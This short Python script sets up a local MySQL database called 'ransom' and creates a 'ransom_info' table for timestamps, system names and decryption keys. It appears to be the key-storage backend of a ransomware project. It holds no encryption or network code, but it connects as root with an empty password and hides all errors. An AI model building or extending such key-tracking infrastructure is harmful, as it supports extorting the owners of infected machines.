import os
import mysql.connector as mysql
from  mysql.connector import Error

try:
    conn = mysql.connect(host='localhost', database='ransom', user='root', password='')
    if conn.is_connected():
        cursor = conn.cursor()
        cursor.execute("select database();")
        record = cursor.fetchone()

        cursor.execute('DROP TABLE IF EXISTS ransom_info;')

        cursor.execute("CREATE TABLE ransom_info(time varchar(255),sys_name varchar(255),dec_key varchar(255))")
except Error as e:
            pass
